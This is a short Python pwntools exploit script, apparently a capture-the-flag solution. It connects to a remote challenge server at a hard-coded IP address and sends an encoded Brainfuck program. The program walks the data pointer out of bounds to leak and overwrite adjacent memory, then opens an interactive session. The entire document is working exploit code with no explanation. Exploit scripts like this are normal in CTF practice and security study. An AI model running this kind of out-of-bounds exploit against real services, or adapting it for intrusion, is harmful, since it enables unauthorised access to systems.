from pwn import *

#target = remote('localhost', 1337)
target = remote('193.57.159.27', 28643)

print(target.recvuntil('program:'))

payload = b''

bf_payload = '<' * (0x130 + 0x8) + '.' + '-' * 58  + '<' + '-' * 0x2 + '<' + '+' * 12


bf_payload += '>' * (8 + 2) + '.' + '<' * 0x10 + '[-' + '>' * 0x10 + '+' + '<' * 0x10 + ']' + '.' + '>' * 0x10
bf_payload += '<' + '.' + '<' * 0x10 + '[-' + '>' * 0x10 + '+' + '<' * 0x10 + ']' + '.'  + '>' * 0x10 + '+' * 0x10
bf_payload += ('<' + '.' + '<' * 0x10 + '[-' + '>' * 0x10 + '+' + '<' * 0x10 + ']' + '.'  + '>' * 0x10) * 4

bf_chars = '<]>[,.-+'
plain = b'\x40\x41\x42\x43\x44\x45\x46\x47'
for char in bf_payload:
	index = bf_chars.find(char)
	payload += chr(plain[index]).encode('ascii')
print(payload)

target.sendline(payload)

target.interactive()

